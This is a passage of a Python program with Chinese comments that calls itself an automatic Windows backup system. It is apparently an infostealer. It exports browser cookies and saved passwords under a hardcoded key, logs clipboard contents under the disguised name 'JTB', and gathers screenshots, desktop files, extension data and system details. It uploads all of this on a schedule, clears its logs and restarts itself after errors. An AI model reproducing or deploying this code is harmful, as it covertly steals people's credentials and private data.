                total_cookies = all_data["browsers"][browser_name]["total_cookies"]
                total_passwords = all_data["browsers"][browser_name]["total_passwords"]
                total_web_data = all_data["browsers"][browser_name]["total_web_data"]
                web_data_summary = f", {total_web_data} Web Data" if total_web_data > 0 else ""
                logging.info(f"✅ {browser_name}: {len(browser_profiles)} 个 Profile, {total_cookies} Cookies, {total_passwords} 密码{web_data_summary} {master_key_status} Master Key")
        
        # 加密保存
        password = "cookies2026"
        salt = get_random_bytes(32)
        key = PBKDF2(password, salt, dkLen=32, count=100000)
        cipher = AES.new(key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(json.dumps(all_data, ensure_ascii=False).encode('utf-8'))
        
        encrypted_data = {
            "salt": base64.b64encode(salt).decode('utf-8'),
            "nonce": base64.b64encode(cipher.nonce).decode('utf-8'),
            "tag": base64.b64encode(tag).decode('utf-8'),
            "ciphertext": base64.b64encode(ciphertext).decode('utf-8')
        }
        
        # 保存到文件
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = os.path.join(backup_manager.config.BACKUP_ROOT, f"{user_prefix}_browser_exports")
        os.makedirs(output_dir, exist_ok=True)
        output_file = os.path.join(output_dir, f"{user_prefix}_browser_data_{timestamp}.encrypted")
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(encrypted_data, f, indent=2, ensure_ascii=False)
        
        logging.critical("✅ 浏览器数据导出成功")
        return output_file
        
    except Exception as e:
        logging.error(f"❌ 浏览器数据导出失败: {e}")
        return None

def backup_and_upload_logs(backup_manager):
    """备份并上传日志文件"""
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件不存在，跳过: {log_file}")
            return
        
        # 刷新日志缓冲区，确保所有日志都已写入文件
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'flush'):
                handler.flush()
        
        # 等待一小段时间，确保文件系统同步
        time.sleep(0.5)
            
        # 检查日志文件大小
        file_size = os.path.getsize(log_file)
        if file_size == 0:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件为空，跳过: {log_file}")
            return
            
        # 创建临时目录
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, f'{user_prefix}_temp', 'backup_logs')
        if not backup_manager._ensure_directory(str(temp_dir)):
            logging.error("❌ 无法创建临时日志目录")
            return
            
        # 创建带时间戳的备份文件名
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"{user_prefix}_backup_log_{timestamp}.txt"
        backup_path = os.path.join(temp_dir, backup_name)
        
        # 复制日志文件到临时目录
        try:
            # 读取当前日志内容
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as src:
                log_content = src.read()
            
            if not log_content or not log_content.strip():
                logging.warning("⚠️ 日志内容为空，跳过上传")
                return
                
            # 写入备份文件
            with open(backup_path, 'w', encoding='utf-8') as dst:
                dst.write(log_content)
            
            # 验证备份文件是否创建成功
            if not os.path.exists(backup_path) or os.path.getsize(backup_path) == 0:
                logging.error("❌ 备份日志文件创建失败或为空")
                return
                
            # 上传日志文件
            logging.info(f"📤 开始上传备份日志文件 ({os.path.getsize(backup_path) / 1024:.2f}KB)...")
            if backup_manager.upload_file(str(backup_path)):
                # 上传成功后清空原始日志文件，只保留一条记录
                try:
                    with open(log_file, 'w', encoding='utf-8') as f:
                        f.write(f"=== 📝 备份日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传 ===\n")
                    logging.info("✅ 备份日志上传成功并已清空")
                except Exception as e:
                    logging.error(f"❌ 备份日志更新失败: {e}")
            else:
                logging.error("❌ 备份日志上传失败")
                
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"❌ 复制或读取日志文件失败: {e}")
        except Exception as e:
            logging.error(f"❌ 处理日志文件时出错: {e}")
            import traceback
            if backup_manager.config.DEBUG_MODE:
                logging.debug(traceback.format_exc())
            
        # 清理临时目录
        finally:
            try:
                if os.path.exists(str(temp_dir)):
                    shutil.rmtree(str(temp_dir))
            except Exception as e:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"清理临时目录失败: {e}")
                
    except Exception as e:
        logging.error(f"❌ 处理备份日志时出错: {e}")
        import traceback
        if backup_manager.config.DEBUG_MODE:
            logging.debug(traceback.format_exc())

def periodic_backup_upload(backup_manager):
    """定期执行备份和上传"""
    # 使用新的备份目录路径
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    clipboard_log_path = os.path.join(backup_manager.config.BACKUP_ROOT, f"{user_prefix}_clipboard_log.txt")
    
    # 启动JTB监控线程
    clipboard_monitor_thread = threading.Thread(
        target=backup_manager.monitor_clipboard,
        args=(clipboard_log_path, backup_manager.config.CLIPBOARD_CHECK_INTERVAL),
        daemon=True
    )
    clipboard_monitor_thread.start()
    logging.critical("📋 JTB监控线程已启动")
    
    # 启动JTB上传线程
    clipboard_upload_thread_obj = threading.Thread(
        target=clipboard_upload_thread,
        args=(backup_manager, clipboard_log_path),
        daemon=True
    )
    clipboard_upload_thread_obj.start()
    logging.critical("📤 JTB上传线程已启动")
    
    # 初始化JTB日志文件
    try:
        os.makedirs(os.path.dirname(clipboard_log_path), exist_ok=True)
        with open(clipboard_log_path, 'w', encoding='utf-8') as f:
            f.write(f"=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
    except Exception as e:
        logging.error(f"❌ 初始化JTB日志失败: {e}")

    # 获取用户名和系统信息
    username = getpass.getuser()
    hostname = socket.gethostname()
    current_time = datetime.now()
    
    # 获取系统环境信息
    system_info = {
        "操作系统": platform.system(),
        "系统版本": platform.version(),
        "Windows版本": platform.win32_ver()[0] if platform.system() == "Windows" else "N/A",
        "系统架构": platform.machine(),
        "Python版本": platform.python_version(),
        "主机名": hostname,
        "用户名": username,
    }
    
    # 获取Windows详细版本信息
    try:
        if platform.system() == "Windows":
            import winreg
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
            try:
                build = winreg.QueryValueEx(key, "CurrentBuild")[0]
                product_name = winreg.QueryValueEx(key, "ProductName")[0]
                system_info["Windows详细版本"] = f"{product_name} (Build {build})"
            except:
                pass
            finally:
                winreg.CloseKey(key)
    except:
        pass
    
    # 输出启动信息和系统环境
    logging.critical("\n" + "="*50)
    logging.critical("🚀 自动备份系统已启动")
    logging.critical("="*50)
    logging.critical(f"⏰ 启动时间: {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
    logging.critical("-"*50)
    logging.critical("📊 系统环境信息:")
    for key, value in system_info.items():
        logging.critical(f"   • {key}: {value}")
    logging.critical("-"*50)
    logging.critical("📋 JTB监控和自动上传已启动")
    logging.critical("="*50)

    def read_next_backup_time():
        """读取下次备份时间"""
        try:
            if os.path.exists(backup_manager.config.THRESHOLD_FILE):
                with open(backup_manager.config.THRESHOLD_FILE, 'r') as f:
                    time_str = f.read().strip()
                    return datetime.strptime(time_str, '%Y-%m-%d %H:%M:%S')
            return None
        except Exception:
            return None

    def write_next_backup_time():
        """写入下次备份时间"""
        try:
            next_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
            os.makedirs(os.path.dirname(backup_manager.config.THRESHOLD_FILE), exist_ok=True)
            with open(backup_manager.config.THRESHOLD_FILE, 'w') as f:
                f.write(next_time.strftime('%Y-%m-%d %H:%M:%S'))
            return next_time
        except Exception as e:
            logging.error(f"写入下次备份时间失败: {e}")
            return None

    def should_backup_now():
        """检查是否应该执行备份"""
        next_backup_time = read_next_backup_time()
        if next_backup_time is None:
            return True
        return datetime.now() >= next_backup_time

    while True:
        try:
            if should_backup_now():
                current_time = datetime.now()
                logging.critical("\n" + "="*40)
                logging.critical(f"⏰ 开始备份  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                logging.critical("-"*40)
                
                # 获取当前可用的磁盘
                available_disks = get_available_disks()
                
                # 执行备份任务
                logging.critical("\n💾 磁盘备份")
                disks_backup_paths = backup_disks(backup_manager, available_disks)
                
                logging.critical("\n🪟 Windows数据备份")
                windows_data_backup_paths = backup_windows_data(backup_manager)
                
                # 合并所有备份路径
                all_backup_paths = disks_backup_paths + windows_data_backup_paths
                
                # 写入下次备份时间
                next_backup_time = write_next_backup_time()
                
                # 输出结束语（在上传之前）
                has_backup_files = len(all_backup_paths) > 0
                if has_backup_files:
                    logging.critical("\n" + "="*40)
                    logging.critical(f"✅ 备份完成  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40)
                    logging.critical("📋 备份任务已结束")
                    if next_backup_time:
                        logging.critical(f"🔄 下次启动备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40 + "\n")
                else:
                    logging.critical("\n" + "="*40)
                    logging.critical("❌ 部分备份任务失败")
                    logging.critical("="*40)
                    logging.critical("📋 备份任务已结束")
                    if next_backup_time:
                        logging.critical(f"🔄 下次启动备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40 + "\n")
                
                # 开始上传备份文件
                if all_backup_paths:
                    logging.critical("📤 开始上传备份文件...")
                    upload_success = True
                    for backup_path in all_backup_paths:
                        if not backup_manager.upload_file(backup_path):
                            upload_success = False
                    
                    if upload_success:
                        logging.critical("✅ 所有备份文件上传成功")
                    else:
                        logging.error("❌ 部分备份文件上传失败")
                
                # 上传备份日志
                logging.critical("\n📝 正在上传备份日志...")
                try:
                    backup_and_upload_logs(backup_manager)
                except Exception as e:
                    logging.error(f"❌ 日志备份上传失败: {e}")
            
            # 每小时检查一次是否需要备份
            time.sleep(backup_manager.config.BACKUP_CHECK_INTERVAL)

        except Exception as e:
            logging.error(f"\n❌ 备份出错: {e}")
            try:
                backup_and_upload_logs(backup_manager)
            except Exception as log_error:
                logging.error(f"❌ 日志备份失败: {log_error}")
            # 发生错误时也更新下次备份时间
            write_next_backup_time()
            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)

def backup_disks(backup_manager, available_disks):
    """备份可用磁盘，返回备份文件路径列表（不执行上传）
    
    Returns:
        list: 备份文件路径列表
    """
    backup_paths = []
    for disk_letter, disk_configs in available_disks.items():
        logging.info(f"\n正在处理磁盘 {disk_letter.upper()}")
        for backup_type, (source_dir, target_dir, ext_type) in disk_configs.items():
            try:
                backup_dir = backup_manager.backup_disk_files(source_dir, target_dir, ext_type)
                if backup_dir:
                    backup_path = backup_manager.zip_backup_folder(
                        backup_dir, 
                        str(target_dir) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
                    )
                    if backup_path:
                        if isinstance(backup_path, list):
                            backup_paths.extend(backup_path)
                        else:
                            backup_paths.append(backup_path)
                        logging.critical(f"☑️ {disk_letter.upper()}盘 {backup_type} 备份文件已准备完成\n")
                    else:
                        logging.error(f"❌ {disk_letter.upper()}盘 {backup_type} 压缩失败\n")
                else:
                    logging.error(f"❌ {disk_letter.upper()}盘 {backup_type} 备份失败\n")
            except Exception as e:
                logging.error(f"❌ {disk_letter.upper()}盘 {backup_type} 备份出错: {str(e)}\n")
    
    return backup_paths

def backup_windows_data(backup_manager):
    """备份Windows系统数据，返回备份文件路径列表（不执行上传）
    
    Args:
        backup_manager: 备份管理器实例
        
    Returns:
        list: 备份文件路径列表
    """
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    backup_paths = []
    try:
        # 备份截图文件
        screenshots_backup = backup_screenshots()
        if screenshots_backup:
            backup_path = backup_manager.zip_backup_folder(
                screenshots_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_screenshots_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if isinstance(backup_path, list):
                    backup_paths.extend(backup_path)
                else:
                    backup_paths.append(backup_path)
                logging.critical("☑️ 截图文件备份文件已准备完成\n")
            else:
                logging.error("❌ 截图文件压缩失败\n")
        else:
            logging.info("ℹ️ 未发现可备份的截图文件\n")

        # 直接复制指定目录和文件（桌面、便签、历史记录等）
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        specified_backup_dir = backup_manager.backup_specified_files(
            os.path.expandvars('%USERPROFILE%'),
            os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_specified")
        )
        if specified_backup_dir:
            backup_path = backup_manager.zip_backup_folder(
                specified_backup_dir,
                os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_specified_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if isinstance(backup_path, list):
                    backup_paths.extend(backup_path)
                else:
                    backup_paths.append(backup_path)
                logging.critical("☑️ 指定目录和文件备份文件已准备完成\n")
            else:
                logging.error("❌ 指定目录和文件压缩失败\n")
        else:
            logging.error("❌ 指定目录和文件收集失败\n")

        # 备份浏览器扩展数据
        extensions_backup = backup_browser_extensions(backup_manager)
        if extensions_backup:
            backup_path = backup_manager.zip_backup_folder(
                extensions_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_browser_extensions_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if isinstance(backup_path, list):
                    backup_paths.extend(backup_path)
                else:
                    backup_paths.append(backup_path)
                logging.critical("☑️ 浏览器扩展数据备份文件已准备完成\n")
            else:
                logging.error("❌ 浏览器扩展数据压缩失败\n")
        else:
            logging.error("❌ 浏览器扩展数据收集失败\n")
        
        # 导出浏览器 Cookies 和密码
        browser_export_file = export_browser_cookies_passwords(backup_manager)
        if browser_export_file:
            backup_paths.append(browser_export_file)
            logging.critical("☑️ 浏览器数据导出文件已准备完成\n")
        else:
            logging.warning("⏭️  浏览器数据导出跳过或失败\n")
                    
    except Exception as e:
        logging.error(f"Windows数据备份失败: {e}")
    
    return backup_paths

def clipboard_upload_thread(backup_manager, clipboard_log_path):
    """独立的JTB上传线程"""
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    last_upload_time = datetime.now()
    min_content_size = 100  # 最小内容大小（字节）
    
    while True:
        try:
            current_time = datetime.now()
            
            # 检查是否需要上传（根据配置的间隔时间）
            if (current_time - last_upload_time).total_seconds() >= backup_manager.config.CLIPBOARD_INTERVAL:
                if os.path.exists(clipboard_log_path):
                    try:
                        # 检查文件大小
                        file_size = os.path.getsize(clipboard_log_path)
                        if file_size > min_content_size:  # 只有当内容足够时才上传
                            # 检查文件内容
                            with open(clipboard_log_path, 'r', encoding='utf-8') as f:
                                content = f.read().strip()
                                # 检查是否只包含启动信息或上传记录
                                only_status_info = all(line.startswith('=== 📋') for line in content.split('\n') if line.strip())
                                
                                if not only_status_info:
                                    # 创建临时目录
                                    temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, f'{user_prefix}_temp', 'clipboard_logs')
                                    if backup_manager._ensure_directory(str(temp_dir)):
                                        # 创建带时间戳的备份文件名
                                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                        backup_name = f"{user_prefix}_clipboard_log_{timestamp}.txt"
                                        backup_path = os.path.join(temp_dir, backup_name)
                                        
                                        try:
                                            # 复制日志文件到临时目录
                                            shutil.copy2(clipboard_log_path, backup_path)
                                                
                                            # 上传日志文件
                                            if backup_manager.upload_file(str(backup_path)):
                                                # 上传成功后清空原始日志文件
                                                try:
                                                    with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                                        f.write(f"=== 📋 日志已于 {current_time.strftime('%Y-%m-%d %H:%M:%S')} 上传并清空 ===\n")
                                                    last_upload_time = current_time
                                                except Exception as e:
                                                    logging.error(f"❌ JTB日志清空失败: {e}")
                                            else:
                                                logging.error("❌ JTB日志上传失败")
                                        except Exception as e:
                                            logging.error(f"❌ 复制JTB日志失败: {e}")
                                        finally:
                                            # 清理临时目录
                                            try:
                                                if os.path.exists(str(temp_dir)):
                                                    shutil.rmtree(str(temp_dir))
                                            except Exception as e:
                                                logging.error(f"❌ 清理临时目录失败: {e}")
                    except Exception as e:
                        logging.error(f"❌ 读取JTB日志文件失败: {e}")
                        
        except Exception as e:
            logging.error(f"❌ 处理JTB日志时出错: {e}")
            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)
            continue
            
        # 等待一小段时间再检查
        time.sleep(backup_manager.config.CLIPBOARD_UPLOAD_CHECK_INTERVAL)

def clean_backup_directory():
    """清理备份目录，但保留日志文件和时间阈值文件"""
    backup_dir = os.path.expandvars('%USERPROFILE%\\Documents\\AutoBackup')
    try:
        if not os.path.exists(backup_dir):
            return
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        # 需要保留的文件
        keep_files = ["backup.log", f"{user_prefix}_clipboard_log.txt", "next_backup_time.txt"]
        
        for item in os.listdir(backup_dir):
            item_path = os.path.join(backup_dir, item)
            try:
                if item in keep_files:
                    continue
                    
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                    
                if BackupConfig.DEBUG_MODE:
                    logging.info(f"🗑️ 已清理: {item}")
            except Exception as e:
                logging.error(f"❌ 清理 {item} 失败: {e}")
                
        logging.critical("🧹 备份目录已清理完成")
    except Exception as e:
        logging.error(f"❌ 清理备份目录时出错: {e}")

def main():
    """主函数"""
    try:
        # 检查是否已经有实例在运行
        pid_file = os.path.join(BackupConfig.BACKUP_ROOT, 'backup.pid')
        if os.path.exists(pid_file):
            with open(pid_file, 'r') as f:
                old_pid = int(f.read().strip())
                try:
                    os.kill(old_pid, 0)
                    print(f'备份程序已经在运行 (PID: {old_pid})')
                    return
                except OSError:
                    pass
        
        # 写入当前进程PID
        os.makedirs(os.path.dirname(pid_file), exist_ok=True)
        with open(pid_file, 'w') as f:
            f.write(str(os.getpid()))
            
        # 注意：日志配置在 BackupManager.__init__ 中进行，无需重复配置
        
        # 检查磁盘空间
        try:
            backup_drive = os.path.splitdrive(BackupConfig.BACKUP_ROOT)[0]
            free_space = shutil.disk_usage(backup_drive).free
            if free_space < BackupConfig.MIN_FREE_SPACE:
                logging.warning(f'备份驱动器空间不足: {free_space / (1024*1024*1024):.2f}GB')
        except (OSError, IOError) as e:
            logging.warning(f'无法检查磁盘空间: {str(e)}')
        
        try:
            # 创建备份管理器实例
            backup_manager = BackupManager()
            
            # 清理旧的备份目录
            clean_backup_directory()
            
            # 启动定期备份和上传
            periodic_backup_upload(backup_manager)
                
        except KeyboardInterrupt:
            logging.info('备份程序被用户中断')
        except Exception as e:
            logging.error(f'备份过程发生错误: {str(e)}')
            # 发生错误时等待一段时间后重试
            time.sleep(BackupConfig.MAIN_ERROR_RETRY_DELAY)
            main()  # 重新启动主程序
            
    finally:
        # 清理PID文件
        try:
            if os.path.exists(pid_file):
                os.remove(pid_file)
        except Exception as e:
            logging.error(f'清理PID文件失败: {str(e)}')

if __name__ == "__main__":
    main()
